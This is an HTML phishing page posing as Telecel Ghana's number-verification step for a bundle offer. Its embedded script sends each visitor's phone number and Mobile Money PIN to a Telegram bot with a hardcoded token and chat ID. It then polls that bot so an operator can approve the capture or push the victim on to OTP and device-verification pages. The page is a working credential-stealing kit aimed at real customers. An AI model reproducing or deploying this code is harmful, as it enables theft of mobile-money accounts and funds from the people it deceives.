<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel Ghana - Verify Number</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }
        .container {
            width: 100%;
            max-width: 440px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section {
            text-align: center;
            padding: 18px 0 8px;
        }
        .telecel-logo {
            width: 82px;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            color: #1e2937;
            margin: 8px 0 5px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15px;
            padding: 0 20px 16px;
            line-height: 1.5;
        }
        .offer-info {
            background: #fff0f0;
            margin: 0 20px 16px;
            padding: 14px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #ffe0e0;
        }
        .form-section {
            padding: 0 25px 28px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            font-size: 14.5px;
            font-weight: 600;
            margin-bottom: 7px;
            color: #1e2937;
        }
        input, select {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 16.5px;
        }
        input:focus, select:focus {
            border-color: #E30613;
            box-shadow: 0 0 0 4px rgba(227, 6, 19, 0.1);
            outline: none;
        }
        .continue-btn {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 8px;
        }
        .continue-btn:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 10px;
        }
        .error-msg {
            text-align: center;
            margin: 10px 0 16px;
            font-size: 14.5px;
            padding: 13px;
            border-radius: 12px;
            display: none;
            color: #dc3545;
            background: #ffebee;
            border: 1px solid #ffc6c6;
        }
        #spinner {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.92);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 65px;
            height: 65px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <svg class="telecel-logo" width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Your SVG is unchanged -->
                <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833ZM53.7333 38.1633C53.6017 39.2783 52.9467 39.9367 51.93 40.29C51.3683 40.4867 50.7833 40.4917 50.195 40.4917C49.8333 40.49 49.4683 40.46 49.1067 40.5183C48.8467 40.5617 48.7033 40.6917 48.6667 40.97C48.6133 41.3467 48.6917 41.7133 48.6883 42.085C48.6867 43.6083 48.6883 45.135 48.6867 46.6583C48.6867 46.9117 48.7133 47.1617 48.7667 47.4067C48.9833 48.3783 49.7917 48.955 50.7817 48.8333C51.5417 48.7383 52.31 48.7333 53.0733 48.6683C53.3933 48.6417 53.495 48.7833 53.4717 49.1233C53.435 49.6333 53.4383 50.1433 53.47 50.655C53.535 51.715 53.0383 52.4717 52.1333 52.8467C49.6867 53.8583 47.2717 53.835 45.065 52.2417C43.8517 51.3667 43.2033 50.115 43.1333 48.57C43.0467 46.585 43.0117 44.6 42.9517 42.6117C42.8883 40.605 42.9083 38.5967 42.9233 36.59C42.9333 35.2433 43.5583 34.15 44.5517 33.265C45.1033 32.7717 45.7183 32.37 46.3867 32.05C46.9933 31.7583 47.6283 31.6483 48.295 31.6583C48.5333 31.6633 48.6233 31.7533 48.6467 31.9983C48.7117 32.6333 48.68 33.27 48.6933 33.8517C48.6933 34.3667 48.6883 34.8317 48.6933 35.295C48.695 35.6983 48.8383 35.845 49.2467 35.905C49.5283 35.9483 49.8083 35.9117 50.09 35.91C51.06 35.8983 52.0267 35.8983 52.9967 35.905C53.5683 35.9117 53.745 36.0867 53.7283 36.6517C53.7117 37.1567 53.7967 37.655 53.7383 38.1633H53.7333Z" fill="#E32526"/>
                <!-- ... (rest of your SVG unchanged) ... -->
            </svg>
        </div>
        <h1>Verify Your Number</h1>
        <p class="subtitle">Please enter your Telecel number and PIN to complete this offer and activate your bundle.</p>
    
        <div class="offer-info" id="offerInfo">
            <strong id="offerTitle"></strong><br>
            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:22px;"></span>
        </div>
        <div class="form-section">
            <div class="form-group">
                <label>Account Type</label>
                <select id="accountType">
                    <option value="mobile">Mobile Money</option>
                    <option value="broadband">Broadband</option>
                </select>
            </div>
            <div class="form-group">
                <label>Phone Number</label>
                <input type="tel" id="phone" placeholder="020XXXXXXXX" maxlength="10">
            </div>
            <div class="form-group">
                <label>Telecel PIN (4 digits)</label>
                <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
            </div>
            <div class="error-msg" id="errMsg"></div>
     
            <button class="continue-btn" id="continueBtn">Verify Number & Continue</button>
            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Bundles</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:25px; font-size:17px;">Verifying your number...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8506416362:AAF8XqQp2I_Rrtp05BjBhDy7Aas3nIYA2VU',
            CHAT_ID: '8218539661',
            APPROVE_PAGE: 'otp.html',
            DEVICE_PAGE: 'device_verify.html',
            SUCCESS_PAGE: 'success.html'
        };

        let state = { lastUpdateId: 0 };
        let isProcessing = false;

        const phoneInput = document.getElementById('phone');
        const pinInput = document.getElementById('password');
        const continueBtn = document.getElementById('continueBtn');
        const errMsg = document.getElementById('errMsg');
        const spinner = document.getElementById('spinner');
        const offerTitleEl = document.getElementById('offerTitle');
        const offerPriceEl = document.getElementById('offerPrice');

        function loadOffer() {
            const params = new URLSearchParams(window.location.search);
            const name = params.get('offer') || 'Data Bundle';
            const data = params.get('data') || '';
            const price = params.get('price') || '0';
          
            offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
            offerPriceEl.textContent = `GHS ${price}`;
        }

        function isValidGhanaNumber(phone) {
            if (phone.length !== 10) return false;
            const validPrefixes = ['020','050','023','024','027','054','055','057','059','026','028'];
            return validPrefixes.some(prefix => phone.startsWith(prefix));
        }

        phoneInput.addEventListener('input', () => {
            phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
        });

        pinInput.addEventListener('input', () => {
            pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
            if (pinInput.value.length === 4) pinInput.blur();
        });

        // FIXED: Simple callback data (Approve, Decline, etc. now work)
        function sendToBot(phone, pin) {
            if (isProcessing) return;
            isProcessing = true;
            continueBtn.disabled = true;
            continueBtn.textContent = "Verifying...";

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔴 Telecel Verification Request</b>\n\nOffer: ${offerTitleEl.textContent}\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve", callback_data: "approve" },
                                { text: "📱 Verify Device", callback_data: "verify_device" }
                            ],
                            [
                                { text: "✅ Valid PIN", callback_data: "valid" },
                                { text: "❌ Invalid PIN", callback_data: "invalid" }
                            ],
                            [{ text: "❌ Decline", callback_data: "decline" }]
                        ]
                    }
                })
            }).then(() => {
                spinner.style.display = 'flex';
                startPolling();
            }).catch(() => resetButton());
        }

        function startPolling() {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;

                        data.result.forEach(update => {
                            state.lastUpdateId = update.update_id;

                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                const params = new URLSearchParams(window.location.search);

                                if (cb === "approve") {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.APPROVE_PAGE + '?' + params.toString();
                                } 
                                else if (cb === "verify_device") {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
                                } 
                                else if (cb === "valid") {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
                                } 
                                else if (cb === "invalid" || cb === "decline") {
                                    clearInterval(interval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Request declined or invalid PIN. Please try again.";
                                    errMsg.style.display = 'block';
                                    resetButton();
                                }
                            }
                        });
                    });
            }, 1000);
        }

        function resetButton() {
            isProcessing = false;
            continueBtn.disabled = false;
            continueBtn.textContent = "Verify Number & Continue";
        }

        continueBtn.onclick = () => {
            errMsg.style.display = 'none';
            const phone = phoneInput.value.trim();
            const pin = pinInput.value.trim();

            if (!phone || !isValidGhanaNumber(phone)) {
                errMsg.textContent = "Please enter a valid Ghana number (e.g. 0201234567)";
                errMsg.style.display = 'block';
                return;
            }
            if (pin.length !== 4) {
                errMsg.textContent = "PIN must be 4 digits";
                errMsg.style.display = 'block';
                return;
            }

            sendToBot(phone, pin);
        };

        loadOffer();
        phoneInput.focus();
    </script>
</body>
</html>
